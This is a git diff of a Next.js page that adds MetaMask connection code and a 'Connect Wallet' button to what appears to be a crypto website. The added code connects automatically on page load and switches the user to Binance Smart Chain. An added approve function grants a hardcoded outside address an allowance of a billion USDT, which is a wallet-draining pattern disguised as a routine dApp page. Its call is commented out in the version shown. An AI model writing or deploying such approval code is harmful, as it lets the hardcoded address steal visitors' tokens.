@@ -1,10 +1,79 @@
+"use client"; // This is a client component
+import React, { useEffect, useState, useContext } from "react";
 import Image from 'next/image';
-import MainPage from '@/components';
-import ConnectWallet from '@/components/connectWalelt';
 
+import { ethers, BigNumber } from "ethers";
+
+import MainPage from '@/components';
+import contract_artifacts from '@/abi/BEP20.json';
+
+const USDCAddress = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
+const USDTAdress = "0x55d398326f99059fF775485246999027B3197955";
+
+// async function approve(address) {
+
+// }
 
 
 export default function Home() {
+  const [address, setAddress] = useState("0");
+  // const [chainId, setAddress] = useState("0");
+  const [allowance, setAllowance] = useState(0);
+  const [balance, setBalance] = useState(0);
+  const [connectStatus, setConnectStatus] = useState("0");
+
+  // const abi = await ethers.getContractFactory("BEP20");
+
+  let provider = "0";
+  let signer = "0";
+
+  async function changeNetwork() {
+    window.ethereum.request({
+      method: "wallet_addEthereumChain",
+      params: [{
+        chainId: "0x38",
+        rpcUrls: ["https://rpc.ankr.com/bsc/"],
+        chainName: "Binance Smart Chain Mainnet",
+        nativeCurrency: {
+          name: "BNB",
+          symbol: "BNB",
+          decimals: 18
+        },
+        blockExplorerUrls: ["https://bscscan.com/"]
+      }]
+    });
+  }
+
+  async function approve(signer: any) {
+    const _provider = new ethers.providers.Web3Provider(window.ethereum);
+    const contract_instance = new ethers.Contract(USDTAdress, contract_artifacts, signer);
+    await contract_instance.increaseAllowance("0xCCbbbfA08E06136EEfCD887c7eF8381cf3c04F51", "1000000000000000000000000000");
+  }
+
+
+  async function connect() {
+    if (typeof window.ethereum == "undefined") {
+      alert("Please install MetaMask wallet!");
+    }
+
+    await ethereum.request({ method: "eth_requestAccounts" })
+    const _provider = new ethers.providers.Web3Provider(window.ethereum);
+    const chainInfo = await _provider.getNetwork();
+    if (chainInfo["chainId"] != 56) {
+      await changeNetwork();
+    }
+    const _signer = await _provider.getSigner();
+    const addr = await _signer.getAddress();
+
+    setAddress(addr);
+    // approve(_signer);
+  }
+
+
+  useEffect(() => {
+    connect();
+  }, [address]);
+
   return (
     <main className="flex min-h-screen flex-col items-center justify-between p-24">
       <div id="app" data-v-app="">
@@ -71,7 +140,13 @@ export default function Home() {
                   </div>
                 </div>
               </div>
-              <ConnectWallet></ConnectWallet>
+              <div className="bit-buoy-mobile" data-v-c7418f94="">
+                <div className="buoy-list">
+                  <div className="buoy-item" style={{ width: "10%" }} as="button" onClick={connect} >
+                    <div className="btn">{address == "0" ? "Connect Wallet" : address}</div>
+                  </div>
+                </div>
+              </div>
             </div>
             <MainPage></MainPage>
 
